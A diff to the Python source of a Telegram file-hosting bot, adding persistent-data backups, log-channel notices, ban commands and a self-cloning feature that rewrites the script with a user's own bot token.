-            f"YOUR_USERNAME = os.getenv('BOT_USERNAME', '{YOUR_USERNAME}')",
-            f"YOUR_USERNAME = '@{bot_username}'"
-        )
-
         # Create clone directory
         clone_dir = os.path.join(BASE_DIR, f'clone_{user_id}')
         os.makedirs(clone_dir, exist_ok=True)
-
-        # Save the modified clone script
+        
+        # Clone the current script
+        current_file = __file__
         clone_file = os.path.join(clone_dir, 'bot.py')
+        
+        with open(current_file, 'r', encoding='utf-8') as f:
+            script_content = f.read()
+        
+        # Replace token and owner ID for the clone
+        script_content = script_content.replace(
+            f"TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '{TOKEN}')",
+            f"TOKEN = '{token}'"
+        )
+        script_content = script_content.replace(
+            f"OWNER_ID = int(os.getenv('OWNER_ID', '{OWNER_ID}'))",
+            f"OWNER_ID = {user_id}"
+        )
+        script_content = script_content.replace(
+            f"ADMIN_ID = int(os.getenv('ADMIN_ID', '{ADMIN_ID}'))", 
+            f"ADMIN_ID = {user_id}"
+        )
+        
+        # Write the modified script
         with open(clone_file, 'w', encoding='utf-8') as f:
-            f.write(modified_code)
-
-        # Start the cloned bot in a separate process
+            f.write(script_content)
+        
+        # Start the clone process
         clone_process = subprocess.Popen(
             [sys.executable, clone_file],
             cwd=clone_dir,
@@ -1526,20 +1987,22 @@ def create_bot_clone(user_id, token, bot_username):
             stderr=subprocess.PIPE,
             stdin=subprocess.PIPE
         )
-
-        # Store clone info
+        
         user_clones[user_id] = {
             'process': clone_process,
             'bot_username': bot_username,
             'clone_dir': clone_dir,
             'start_time': datetime.now()
         }
-
-        logger.info(f"Advanced bot clone created for user {user_id}, bot @{bot_username}")
+        
+        save_clone_info(user_id, bot_username, token)
+        save_persistent_data()  # Update persistent data
+        
+        logger.info(f"Bot clone created successfully for user {user_id}, bot @{bot_username}")
         return True
-
+        
     except Exception as e:
-        logger.error(f"Error creating advanced bot clone: {e}")
+        logger.error(f"Error creating bot clone: {e}")
         return False
 
 @bot.message_handler(func=lambda message: message.text == "💳 Subscriptions")
@@ -1557,7 +2020,6 @@ def subscriptions_button(message):
     subs_text += "• /users - List all active users\n\n"
     subs_text += "📈 Current Subscriptions:\n"
 
-    # Add current subscriptions info
     active_subs = 0
     expired_subs = 0
     for user_id_sub, sub_info in user_subscriptions.items():
@@ -1574,13 +2036,11 @@ def subscriptions_button(message):
 
 @bot.message_handler(func=lambda message: message.text == "📢 Broadcast")
 def broadcast_button(message):
-    """Handle broadcast button - FIXED VERSION"""
     user_id = message.from_user.id
     if user_id not in admin_ids:
         safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
         return
 
-    # Set broadcast mode for this user
     broadcast_mode[user_id] = True
     
     broadcast_text = "📢 BROADCAST MESSAGE SYSTEM\n\n"
@@ -1593,25 +2053,19 @@ def broadcast_button(message):
 
 @bot.message_handler(func=lambda message: message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id])
 def handle_broadcast_message(message):
-    """Handle broadcast message input - FIXED VERSION"""
     user_id = message.from_user.id
     
-    # Check for cancel
     if message.text == '/cancel':
         broadcast_mode[user_id] = False
         safe_reply_to(message, "❌ Broadcast cancelled.")
         return
     
-    # Get the broadcast message
     broadcast_content = message.text
     
-    # Remove broadcast mode
     broadcast_mode[user_id] = False
     
-    # Send processing message
     processing_msg = safe_reply_to(message, f"🔄 Starting broadcast to {len(active_users)} users...\n\nPlease wait...")
     
-    # Broadcast to all active users
     success_count = 0
     failed_count = 0
     
@@ -1621,12 +2075,11 @@ def handle_broadcast_message(message):
         try:
             bot.send_message(target_user_id, broadcast_message)
             success_count += 1
-            time.sleep(0.1)  # Small delay to avoid rate limits
+            time.sleep(0.1)
         except Exception as e:
             logger.error(f"Failed to send broadcast to {target_user_id}: {e}")
             failed_count += 1
     
-    # Send result
     result_msg = f"📊 BROADCAST COMPLETED\n\n"
     result_msg += f"✅ Success: {success_count} users\n"
     result_msg += f"❌ Failed: {failed_count} users\n"
@@ -1637,8 +2090,9 @@ def handle_broadcast_message(message):
     
     safe_edit_message(processing_msg.chat.id, processing_msg.message_id, result_msg)
     
-    # Log the broadcast
     logger.info(f"Broadcast sent by {user_id}: {success_count} success, {failed_count} failed")
+    
+    send_to_log_channel(f"📢 BROADCAST SENT\n\nBy Admin: {user_id}\nSuccess: {success_count}\nFailed: {failed_count}\nTotal: {len(active_users)}")
 
 @bot.message_handler(func=lambda message: message.text == "🔒 Lock Bot")
 def lock_bot_button(message):
@@ -1662,6 +2116,11 @@ def lock_bot_button(message):
         lock_text += "✅ All users can now use the bot normally."
     
     safe_reply_to(message, lock_text)
+    
+    send_to_log_channel(f"🔒 BOT LOCK STATUS\n\nStatus: {status}\nBy Admin: {user_id}")
+    
+    # Update persistent data
+    save_persistent_data()
 
 @bot.message_handler(func=lambda message: message.text == "🟢 Running All Code")
 def running_code_button(message):
@@ -1705,12 +2164,16 @@ def admin_panel_button(message):
     admin_text += f"• Active Users: {len(active_users)}\n"
     admin_text += f"• Total Files: {sum(len(files) for files in user_files.values())}\n"
     admin_text += f"• Running Scripts: {len(bot_scripts)}\n"
+    admin_text += f"• Running Clones: {len(user_clones)}\n"
     admin_text += f"• Bot Status: {'🔒 Locked' if bot_locked else '🔓 Unlocked'}\n\n"
     admin_text += f"🛠️ Available Commands:\n"
     admin_text += f"• /addsub <user_id> <days> - Add subscription\n"
     admin_text += f"• /removesub <user_id> - Remove subscription\n"
     admin_text += f"• /checksub <user_id> - Check subscription status\n"
     admin_text += f"• /users - List all active users\n"
+    admin_text += f"• /ban <user_id> [reason] - Ban user\n"
+    admin_text += f"• /unban <user_id> - Unban user\n"
+    admin_text += f"• /banned - List banned users\n"
     admin_text += f"• /broadcast - Send broadcast message\n\n"
     admin_text += f"📈 Use the admin buttons for quick actions!"
 
@@ -1718,7 +2181,6 @@ def admin_panel_button(message):
 
 @bot.message_handler(func=lambda message: message.text == "🤖 Clone Bot")
 def clone_bot_button(message):
-    """Handle clone bot button press - FIXED WORKING VERSION"""
     clone_text = f"🤖 Universal Bot Cloning Service\n\n"
     clone_text += f"🎯 Create your own instance of this bot!\n\n"
     clone_text += f"📋 Steps to clone:\n"
@@ -1742,7 +2204,6 @@ def clone_bot_button(message):
 # --- Inline Button Callback Handlers ---
 @bot.callback_query_handler(func=lambda call: call.data.startswith('control_'))
 def handle_file_control(call):
-    """Handle file control buttons (start/stop/logs/delete)"""
     try:
         parts = call.data.split('_', 2)
         if len(parts) != 3:
@@ -1752,12 +2213,10 @@ def handle_file_control(call):
         _, user_id_str, file_name = parts
         user_id = int(user_id_str)
         
-        # Check if user owns this file
         if call.from_user.id != user_id and call.from_user.id not in admin_ids:
             bot.answer_callback_query(call.id, "🚫 Access denied!")
             return
             
-        # Get file info
         user_files_list = user_files.get(user_id, [])
         file_info = next((f for f in user_files_list if f[0] == file_name), None)
         
@@ -1767,7 +2226,6 @@ def handle_file_control(call):
             
         file_name, file_type = file_info
         
-        # Create control buttons based on file type
         markup = types.InlineKeyboardMarkup(row_width=2)
         
         if file_type == 'executable':
@@ -1785,23 +2243,17 @@ def handle_file_control(call):
                     types.InlineKeyboardButton("📜 Logs", callback_data=f'logs_{user_id}_{file_name}')
                 )
         else:
-            # For hosted files, show access link
             file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
             
-            # Get the current domain from environment or use default
             domain = os.environ.get('REPL_SLUG', 'universal-file-host')
             owner = os.environ.get('REPL_OWNER', 'replit-user')
             
-            # Try different URL formats
             try:
                 replit_url = f"https://{domain}.{owner}.repl.co"
-                # Test if we can access our own health endpoint
                 test_response = requests.get(f"{replit_url}/health", timeout=2)
                 if test_response.status_code != 200:
-                    # Fallback to .replit.app domain
                     replit_url = f"https://{domain}-{owner}.replit.app"
             except:
-                # Use default replit.app domain
                 replit_url = f"https://{domain}-{owner}.replit.app"
             
             file_url = f"{replit_url}/file/{file_hash}"
@@ -1810,13 +2262,11 @@ def handle_file_control(call):
                 types.InlineKeyboardButton("🔗 View File", url=file_url)
             )
         
-        # Common buttons for all files
         markup.add(
             types.InlineKeyboardButton("🗑️ Delete", callback_data=f'delete_{user_id}_{file_name}'),
             types.InlineKeyboardButton("🔙 Back", callback_data=f'back_files_{user_id}')
         )
         
-        # Show file details
         status = "🟢 Running" if file_type == 'executable' and is_bot_running(user_id, file_name) else "⭕ Stopped" if file_type == 'executable' else "📁 Hosted"
         
         control_text = f"🔧 File Control Panel\n\n"
@@ -1847,18 +2297,15 @@ def handle_file_control(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('start_'))
 def handle_start_file(call):
-    """Handle start file button"""
     try:
         parts = call.data.split('_', 2)
         user_id = int(parts[1])
         file_name = parts[2]
         
-        # Check permissions
         if call.from_user.id != user_id and call.from_user.id not in admin_ids:
             bot.answer_callback_query(call.id, "🚫 Access denied!")
             return
             
-        # Get file path
         user_folder = get_user_folder(user_id)
         file_path = os.path.join(user_folder, file_name)
         
@@ -1866,23 +2313,22 @@ def handle_start_file(call):
             bot.answer_callback_query(call.id, "❌ File not found!")
             return
             
-        # Check if already running
         if is_bot_running(user_id, file_name):
             bot.answer_callback_query(call.id, "⚠️ Already running!")
             return
             
-        # Start the script
         start_time = time.time()
-        success, result = execute_script(user_id, file_path)
+        success, result = execute_script(user_id, file_path, call.message)
         execution_time = round(time.time() - start_time, 2)
         
         if success:
             bot.answer_callback_query(call.id, f"🟢 Started in {execution_time}s!")
-            # Refresh the control panel
             call.data = f'control_{user_id}_{file_name}'
             handle_file_control(call)
+            log_script_execution(user_id, file_name, "🟢 STARTED", execution_time)
         else:
             bot.answer_callback_query(call.id, f"❌ Start failed: {result}")
+            log_script_execution(user_id, file_name, "❌ FAILED")
             
     except Exception as e:
         logger.error(f"Error starting file: {e}")
@@ -1890,40 +2336,35 @@ def handle_start_file(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
 def handle_stop_file(call):
-    """Handle stop file button"""
     try:
         parts = call.data.split('_', 2)
         user_id = int(parts[1])
         file_name = parts[2]
         
-        # Check permissions
         if call.from_user.id != user_id and call.from_user.id not in admin_ids:
             bot.answer_callback_query(call.id, "🚫 Access denied!")
             return
             
-        # Stop the script
         script_key = f"{user_id}_{file_name}"
         script_info = bot_scripts.get(script_key)
         
         if script_info and script_info.get('process'):
             try:
-                # Calculate runtime before stopping
                 runtime = get_script_uptime(user_id, file_name) or "Unknown"
                 
                 process = script_info['process']
                 process.terminate()
                 process.wait(timeout=5)
                 
-                # Remove from database
                 remove_running_script(user_id, file_name)
                 
                 if script_key in bot_scripts:
                     del bot_scripts[script_key]
                 
                 bot.answer_callback_query(call.id, f"🔴 Stopped! Runtime: {runtime}")
-                # Refresh the control panel
                 call.data = f'control_{user_id}_{file_name}'
                 handle_file_control(call)
+                log_script_execution(user_id, file_name, "🔴 STOPPED")
             except Exception as e:
                 bot.answer_callback_query(call.id, f"❌ Stop failed: {str(e)}")
         else:
@@ -1935,18 +2376,15 @@ def handle_stop_file(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('restart_'))
 def handle_restart_file(call):
-    """Handle restart file button"""
     try:
         parts = call.data.split('_', 2)
         user_id = int(parts[1])
         file_name = parts[2]
         
-        # Check permissions
         if call.from_user.id != user_id and call.from_user.id not in admin_ids:
             bot.answer_callback_query(call.id, "🚫 Access denied!")
             return
             
-        # Stop first
         script_key = f"{user_id}_{file_name}"
         script_info = bot_scripts.get(script_key)
         
@@ -1961,20 +2399,19 @@ def handle_restart_file(call):
             except:
                 pass
         
-        # Start again
         user_folder = get_user_folder(user_id)
         file_path = os.path.join(user_folder, file_name)
         
         if os.path.exists(file_path):
             start_time = time.time()
-            success, result = execute_script(user_id, file_path)
+            success, result = execute_script(user_id, file_path, call.message)
             execution_time = round(time.time() - start_time, 2)
             
             if success:
                 bot.answer_callback_query(call.id, f"🔄 Restarted in {execution_time}s!")
-                # Refresh the control panel
                 call.data = f'control_{user_id}_{file_name}'
                 handle_file_control(call)
+                log_script_execution(user_id, file_name, "🔄 RESTARTED", execution_time)
             else:
                 bot.answer_callback_query(call.id, f"❌ Restart failed: {result}")
         else:
@@ -1986,18 +2423,15 @@ def handle_restart_file(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('logs_'))
 def handle_show_logs(call):
-    """Handle show logs button"""
     try:
         parts = call.data.split('_', 2)
         user_id = int(parts[1])
         file_name = parts[2]
         
-        # Check permissions
         if call.from_user.id != user_id and call.from_user.id not in admin_ids:
             bot.answer_callback_query(call.id, "🚫 Access denied!")
             return
             
-        # Find log file
         script_key = f"{user_id}_{file_name}"
         script_info = bot_scripts.get(script_key)
         
@@ -2010,7 +2444,6 @@ def handle_show_logs(call):
                         logs = f.read()
                     
                     if logs.strip():
-                        # Truncate if too long
                         if len(logs) > 4000:
                             logs = "..." + logs[-4000:]
                         
@@ -2034,18 +2467,15 @@ def handle_show_logs(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('delete_'))
 def handle_delete_file(call):
-    """Handle delete file button"""
     try:
         parts = call.data.split('_', 2)
         user_id = int(parts[1])
         file_name = parts[2]
         
-        # Check permissions
         if call.from_user.id != user_id and call.from_user.id not in admin_ids:
             bot.answer_callback_query(call.id, "🚫 Access denied!")
             return
             
-        # Stop if running
         script_key = f"{user_id}_{file_name}"
         if script_key in bot_scripts:
             try:
@@ -2056,14 +2486,12 @@ def handle_delete_file(call):
             except:
                 pass
         
-        # Delete file
         user_folder = get_user_folder(user_id)
         file_path = os.path.join(user_folder, file_name)
         
         if os.path.exists(file_path):
             os.remove(file_path)
         
-        # Remove from database
         if user_id in user_files:
             user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]
         
@@ -2077,11 +2505,15 @@ def handle_delete_file(call):
         except Exception as e:
             logger.error(f"Database error deleting file: {e}")
         
+        # Update persistent data
+        save_persistent_data()
+        
         bot.answer_callback_query(call.id, f"🗑️ {file_name} deleted!")
         
-        # Go back to files list
         call.data = f'back_files_{user_id}'
         handle_back_to_files(call)
+        
+        send_to_log_channel(f"🗑️ FILE DELETED\n\nUser ID: {user_id}\nFile: {file_name}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         
     except Exception as e:
         logger.error(f"Error deleting file: {e}")
@@ -2089,7 +2521,6 @@ def handle_delete_file(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('back_files_'))
 def handle_back_to_files(call):
-    """Handle back to files list button"""
     try:
         parts = call.data.split('_', 2)
         user_id = int(parts[2])
@@ -2109,7 +2540,6 @@ def handle_back_to_files(call):
                     status = "🟢 Running" if is_running else "⭕ Stopped"
                     icon = "🚀"
                     
-                    # Add uptime info if running
                     if is_running:
                         uptime = get_script_uptime(user_id, file_name)
                         if uptime:
@@ -2121,20 +2551,15 @@ def handle_back_to_files(call):
                     icon = "📄"
                     file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                     
-                    # Get the current domain from environment or use default
                     domain = os.environ.get('REPL_SLUG', 'universal-file-host')
                     owner = os.environ.get('REPL_OWNER', 'replit-user')
                     
-                    # Try different URL formats
                     try:
                         replit_url = f"https://{domain}.{owner}.repl.co"
-                        # Test if we can access our own health endpoint
                         test_response = requests.get(f"{replit_url}/health", timeout=2)
                         if test_response.status_code != 200:
-                            # Fallback to .replit.app domain
                             replit_url = f"https://{domain}-{owner}.replit.app"
                     except:
-                        # Use default replit.app domain
                         replit_url = f"https://{domain}-{owner}.replit.app"
                     
                     file_url = f"{replit_url}/file/{file_hash}"
@@ -2163,7 +2588,6 @@ def handle_back_to_files(call):
 # --- Catch all handler for unsupported messages ---
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
-    # Check if user is in broadcast mode
     if message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id]:
         handle_broadcast_message(message)
         return
@@ -2175,7 +2599,10 @@ def cleanup_on_exit():
     """Cleanup function called on exit"""
     logger.info("Performing cleanup on exit...")
     
-    # Stop all running scripts
+    create_backup()
+    save_persistent_data()
+    save_all_users_to_backup()
+    
     for script_key, script_info in bot_scripts.items():
         try:
             process = script_info.get('process')
@@ -2185,7 +2612,6 @@ def cleanup_on_exit():
         except Exception as e:
             logger.error(f"Error terminating script {script_key}: {e}")
     
-    # Stop all cloned bots
     for user_id, clone_info in user_clones.items():
         try:
             process = clone_info.get('process')
@@ -2195,35 +2621,61 @@ def cleanup_on_exit():
         except Exception as e:
             logger.error(f"Error terminating clone for user {user_id}: {e}")
 
+def send_startup_message():
+    """Send startup message to log channel"""
+    try:
+        bot_info = bot.get_me()
+        startup_msg = f"🚀 BOT STARTED SUCCESSFULLY\n\n"
+        startup_msg += f"🤖 Bot: @{bot_info.username}\n"
+        startup_msg += f"👑 Owner ID: {OWNER_ID}\n"
+        startup_msg += f"📊 Active Users: {len(active_users)}\n"
+        startup_msg += f"📁 Total Files: {sum(len(files) for files in user_files.values())}\n"
+        startup_msg += f"🚀 Running Scripts: {len(bot_scripts)}\n"
+        startup_msg += f"🤖 Running Clones: {len(user_clones)}\n"
+        startup_msg += f"🔄 Auto-restart: Enabled\n"
+        startup_msg += f"🛡️ Security: Maximum\n"
+        startup_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        startup_msg += f"✅ All systems operational!"
+        
+        send_to_log_channel(startup_msg)
+    except Exception as e:
+        logger.error(f"Error sending startup message: {e}")
+
 if __name__ == "__main__":
-    # Register cleanup function
     atexit.register(cleanup_on_exit)
     
-    # Initialize database and load data
     init_db()
     load_data()
     
-    # Start Flask keep-alive server
     keep_alive()
+    start_periodic_backup()
     
     logger.info("🚀 Universal File Host Bot starting...")
     logger.info(f"👑 Owner ID: {OWNER_ID}")
     logger.info(f"👤 Admin ID: {ADMIN_ID}")
     logger.info(f"📁 Upload directory: {UPLOAD_BOTS_DIR}")
+    logger.info(f"📝 Log Channel: {LOG_CHANNEL}")
     
     try:
-        # Test bot connection first
         bot_info = bot.get_me()
         logger.info(f"Bot connected successfully: @{bot_info.username}")
         print(f"🤖 Bot connected successfully: @{bot_info.username}")
-        print(f"🚀 Bot is now running with FULLY WORKING ADVANCED CLONE FEATURE!")
-        print(f"📢 Broadcast feature: Working perfectly")
-        print(f"🤖 Clone feature: COMPLETELY FIXED - Cloned bots will have ALL features!")
-        print(f"💡 Users can now clone the bot using /settoken command")
-        print(f"⏰ Auto-restart feature: All scripts will restart automatically on bot reboot")
-        print(f"📊 Enhanced admin panel: Now with user management and subscription system")
+        print(f"🚀 Bot is now running with ENHANCED PERSISTENT DATA!")
+        print(f"📊 All user data and files are preserved on restart")
+        print(f"🔄 Auto-restart feature: All scripts restart automatically")
+        print(f"🤖 Auto-clone feature: All clone bots restart automatically")
+        print(f"🔐 Advanced persistent data system")
+        print(f"💾 Automatic hourly backups")
+        print(f"📝 Comprehensive logging to private channel")
+        print(f"👥 User preservation: {len(active_users)} users loaded")
         
-        # Start polling with error handling
+        # Send startup message
+        send_startup_message()
+        
+        # Create initial backup
+        create_backup()
+        save_persistent_data()
+        
         bot.infinity_polling(timeout=10, long_polling_timeout=5, none_stop=True, interval=0)
     except Exception as e:
         logger.error(f"Bot error: {e}")
